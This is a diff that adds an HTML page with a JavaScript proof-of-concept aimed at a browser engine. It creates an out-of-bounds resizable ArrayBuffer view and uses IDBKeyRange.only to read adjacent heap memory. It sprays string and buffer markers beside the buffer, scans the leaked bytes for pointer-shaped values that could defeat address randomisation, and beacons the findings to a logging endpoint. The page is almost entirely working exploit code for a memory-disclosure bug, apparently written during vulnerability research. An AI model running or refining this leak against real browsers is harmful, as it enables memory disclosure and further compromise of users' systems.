@@ -1,0 +1,184 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>oobadj — does an out-of-bounds resizable view read *adjacent fastMalloc chunks*?</title>
+<body><p id="p">oobadj</p>
+<script>
+// docs/99.  docs/96 found one ungated OOB read: IDBKeyRange.only(view).lower copies the RAW
+// byteLength() of an out-of-bounds resizable view into a JS ArrayBuffer.  docs/96 could not leak a
+// pointer because every byte it read was page-written or zero.  The open question this page
+// answers, with a self-diagnosing control, is WHY:
+//
+//   ArrayBuffer data comes from Gigacage::tryMalloc (ArrayBuffer.cpp:132).  The cage is compiled in
+//   on Linux x86_64 (Gigacage.h:42-47) but can be *runtime*-disabled when its reservation fails.
+//     - cage OFF (the skill records this state for 14.10) -> AB data is plain fastMalloc, and the
+//       overflow lands in neighbouring fastMalloc chunks, which can be page-controlled AND hold
+//       engine pointers (a StringImpl's +8 is its character pointer).
+//     - cage ON  -> the overflow stays inside the cage, where only other ArrayBuffers live; the
+//       neighbours are then page data and no address can ever come out of this shape.
+//
+// So the page plants *markers* of both kinds next to the buffer and reports which kind the overflow
+// finds.  A marker hit is the adjacency witness; the StringImpl arm is the one that decides
+// cage-on vs cage-off, because a StringImpl is never in the cage.
+//
+// arms:  str=<i>   plant class-N StringImpls (0x14 + N bytes) after the buffer, read, count markers
+//        ab=<i>    plant class-N ArrayBuffers after it (adjacency control, works either way)
+//        leak=<i>  no planting: count pointer-shaped words in whatever the class holds
+//        nosh=<i>  same view, no shrink -> in-bounds resizable view reads 0 bytes (control)
+// knobs: n=<bytes> (default 4096), k=<count> (default 64), str=<text>
+(function () {
+  'use strict';
+  function B(m, x) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)) + (x ? '&' + x : ''); } catch (e) {} }
+  var Q = new URLSearchParams(location.search);
+  function K(k, d) { return Q.has(k) ? Q.get(k) : d; }
+
+  var ARM = K('arm', 'leak');
+  var N   = Math.max(2, parseInt(K('n', '4096'), 10));
+  var MX  = Math.max(N, parseInt(K('mx', String(N)), 10));   // committed page is 64 KiB (PageCount.h:111)
+  var VL  = Math.min(MX, Math.max(1, parseInt(K('v', String(N)), 10)));
+  var CNT = Math.max(0, parseInt(K('k', '64'), 10));
+  var TXT = K('str', 'MARKERSTRING').slice(0, 64);
+
+  B('cap', 'arm=' + ARM + '&n=' + N + '&mx=' + MX + '&v=' + VL + '&k=' + CNT +
+    '&idbkr=' + (typeof IDBKeyRange) + '&only=' + (typeof (window.IDBKeyRange && IDBKeyRange.only)) +
+    '&rs=' + (typeof ArrayBuffer.prototype.resize) + '&mc=' + (typeof MessageChannel));
+
+  if (typeof IDBKeyRange === 'undefined' || typeof ArrayBuffer.prototype.resize !== 'function') {
+    B('noenv', 'arm=' + ARM); B('done', 'arm=' + ARM); return;
+  }
+
+  // the class-N payload for the string arm: one marker, padded to exactly N bytes
+  var sLen = Math.max(1, N - 0x14);
+  function markerOf(i) {
+    var head = 'M' + i + ':' + TXT + ':';
+    var s = head;
+    while (s.length < sLen) s += 'A';
+    return s.slice(0, sLen);
+  }
+
+  function scan(bytes, look) {
+    // look: a literal byte sequence to find; also collects pointer-shaped u32 pairs
+    var hits = [], pairs = [], i, j, ok;
+    if (look) {
+      var L = look.length;
+      for (i = 0; i + L <= bytes.length; i++) {
+        ok = true;
+        for (j = 0; j < L; j++) if (bytes[i + j] !== look.charCodeAt(j)) { ok = false; break; }
+        if (ok) hits.push(i);
+      }
+    }
+    for (i = 0; i + 8 <= bytes.length; i += 4) {
+      var lo = bytes[i] | (bytes[i + 1] << 8) | (bytes[i + 2] << 16) | (bytes[i + 3] << 24);
+      var hi = bytes[i + 4] | (bytes[i + 5] << 8) | (bytes[i + 6] << 16) | (bytes[i + 7] << 24);
+      var hiU = hi >>> 0;
+      var loU = lo >>> 0;
+      // canonical, aligned, plausibly mapped: 0x7f.. (heap/lib), 0x00000d..-0x00000f.. (cage), 0x00005.. (cage2)
+      var isP = (loU & 7) === 0 && loU > 0x1000 && (
+        (hiU >= 0x7f000000 && hiU <= 0x80000000) ||
+        (hiU >= 0x00000c00 && hiU <= 0x00001000) ||
+        (hiU >= 0x00004000 && hiU <= 0x00008000));
+      if (isP) pairs.push(i + ':' + hiU.toString(16) + '_' + loU.toString(16));
+    }
+    return { hits: hits, pairs: pairs };
+  }
+
+  function run() {
+    var tag = 'R0';
+    var keepAB = [], keepStr = [], keepAB2 = [];
+
+    // 1. the OOB buffer, allocated first
+    var buf;
+    try { buf = new ArrayBuffer(N, { maxByteLength: MX }); }
+    catch (e) { B('mkfail', 'e=' + e.name); B('done', 'arm=' + ARM); return; }
+    var u = new Uint8Array(buf);
+    for (var i = 0; i < N; i++) u[i] = 0x5A;
+
+    // 2. neighbours of the same class, allocated *after* the buffer
+    var mi = 0;
+    if (ARM === 'str') {
+      for (mi = 0; mi < CNT; mi++) keepStr.push(markerOf(mi));
+    } else if (ARM === 'ab') {
+      for (mi = 0; mi < CNT; mi++) {
+        var b2 = new ArrayBuffer(N, { maxByteLength: N });
+        var u2 = new Uint8Array(b2);
+        var m2 = ('ABMARK' + mi + ':').slice(0, 16);
+        for (var j = 0; j < N; j++) u2[j] = m2.charCodeAt(j % m2.length);
+        keepAB.push(b2); keepAB2.push(u2);
+      }
+    }
+
+    // 3. the view, then shrink so it is out of bounds
+    // the ctor validates against the CURRENT byteLength, so grow to the view length first
+    if (VL > buf.byteLength) buf.resize(VL);
+    B('step', 'arm=' + ARM + '&at=view&bl=' + buf.byteLength + '&mx=' + buf.maxByteLength);
+    var v;
+    try { v = new Uint8Array(buf, 0, VL); }
+    catch (e) { B('viewfail', 'arm=' + ARM + '&v=' + VL + '&e=' + e.name + '&m=' + encodeURIComponent(String(e.message).slice(0, 40))); B('done', 'arm=' + ARM); return; }
+    B('step', 'arm=' + ARM + '&at=viewok&vl=' + v.length);
+    if (ARM !== 'nosh') buf.resize(16);
+    var rawLen = -1;
+    try { rawLen = v.length; } catch (e) {}
+
+    // 4. the ungated producer
+    var out;
+    try { out = IDBKeyRange.only(v).lower; }
+    catch (e) {
+      B('idbfail', 'arm=' + ARM + '&rawlen=' + rawLen + '&e=' + e.name + '&m=' + encodeURIComponent(String(e.message).slice(0, 40)));
+      B('done', 'arm=' + ARM); return;
+    }
+    var bytes = new Uint8Array(out);
+
+    // 5. score
+    var look = null, kind = 'none';
+    if (ARM === 'str' && CNT) { look = 'M0:' + TXT + ':'; kind = 'str'; }
+    else if (ARM === 'ab' && CNT) { look = 'ABMARK0:'; kind = 'ab'; }
+    var res = scan(bytes, look);
+
+    // how many distinct neighbours are visible, for the str/ab arms
+    var seen = 0, firstOff = -1;
+    if (kind === 'str') {
+      for (var q = 0; q < CNT; q++) {
+        var pat = ('M' + q + ':' + TXT + ':');
+        var found = -1;
+        for (var r = 0; r + pat.length <= bytes.length; r++) {
+          var same = true;
+          for (var t = 0; t < pat.length; t++) if (bytes[r + t] !== pat.charCodeAt(t)) { same = false; break; }
+          if (same) { found = r; break; }
+        }
+        if (found >= 0) { seen++; if (firstOff < 0) firstOff = found; }
+      }
+    } else if (kind === 'ab') {
+      for (var q = 0; q < CNT; q++) {
+        var pat2 = ('ABMARK' + q + ':');
+        var found2 = -1;
+        for (var r = 0; r + pat2.length <= bytes.length; r++) {
+          var same2 = true;
+          for (var t = 0; t < pat2.length; t++) if (bytes[r + t] !== pat2.charCodeAt(t)) { same2 = false; break; }
+          if (same2) { found2 = r; break; }
+        }
+        if (found2 >= 0) { seen++; if (firstOff < 0) firstOff = found2; }
+      }
+    }
+
+    var nz = 0;
+    for (var z = 0; z < bytes.length; z++) if (bytes[z] !== 0) nz++;
+
+    B('res' + tag, 'arm=' + ARM + '&n=' + N + '&mx=' + MX + '&v=' + VL + '&k=' + CNT + '&bl=' + bytes.length + '&rawlen=' + rawLen +
+      '&nz=' + nz + '&seen=' + seen + '&first=' + firstOff +
+      '&pairs=' + res.pairs.length + '&hit0=' + (res.hits.length ? res.hits[0] : -1) +
+      '&keep=' + keepStr.length + '/' + keepAB.length);
+    // the first eight candidate pairs, for the record
+    if (res.pairs.length) B('pair' + tag, 'arm=' + ARM + '&p=' + res.pairs.slice(0, 8).join(','));
+    // the first pointer-shaped word's neighbourhood, as hex
+    if (res.pairs.length) {
+      var at = parseInt(res.pairs[0].split(':')[0], 10);
+      var hx = '';
+      for (var i2 = Math.max(0, at - 16); i2 < Math.min(bytes.length, at + 32); i2++) hx += ('0' + bytes[i2].toString(16)).slice(-2);
+      B('hex' + tag, 'arm=' + ARM + '&at=' + at + '&h=' + hx);
+    }
+    B('done', 'arm=' + ARM);
+  }
+
+  setTimeout(run, 100);
+})();
+</script>
+</body>
